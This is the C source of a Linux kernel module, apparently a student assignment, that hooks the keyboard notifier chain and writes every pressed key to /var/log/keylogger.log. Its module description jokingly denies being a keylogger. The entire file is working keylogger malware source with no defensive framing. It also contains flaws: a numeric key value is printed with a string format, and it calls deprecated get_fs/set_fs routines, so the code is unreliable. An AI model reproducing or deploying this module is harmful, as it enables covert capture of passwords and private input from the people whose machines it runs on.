#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/notifier.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

#define LOGFILE "/var/log/keylogger.log"


MODULE_LICENSE("GPL");
MODULE_AUTHOR("281443-279460");
MODULE_DESCRIPTION("is definitly not keylogger");
MODULE_VERSION("1.0");




static int keylogger_notifier(struct notifier_block *nblock, unsigned long code, void *data);


static struct notifier_block keylogger_nb = {
    .notifier_call = keylogger_notifier,
};


static int keylogger_notifier(struct notifier_block *nblock, unsigned long code, void *data) {
    struct keyboard_notifier_param *param = data;

    if (code == KBD_KEYSYM && param->down) { 
        char log_entry[64];
        struct file *log_file;
        mm_segment_t old_fs;

        snprintf(log_entry, sizeof(log_entry), "Pressed: %s\n", param->value);
        
        old_fs = get_fs();
        set_fs(KERNEL_DS); 
        
        log_file = filp_open(LOGFILE, O_WRONLY | O_CREAT | O_APPEND, 0644);
        if (!IS_ERR(log_file)) {
            vfs_write(log_file, log_entry, strlen(log_entry), &log_file->f_pos);
            filp_close(log_file, NULL);
        }

        set_fs(old_fs); 
    }
    return NOTIFY_OK;
}


static int __init keylogger_init(void) {
    printk(KERN_INFO "Keylogger module loaded\n");
    register_keyboard_notifier(&keylogger_nb);
    return 0;
}

// Funkcja czyszcząca moduł
static void __exit keylogger_exit(void) {
    unregister_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Keylogger module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);


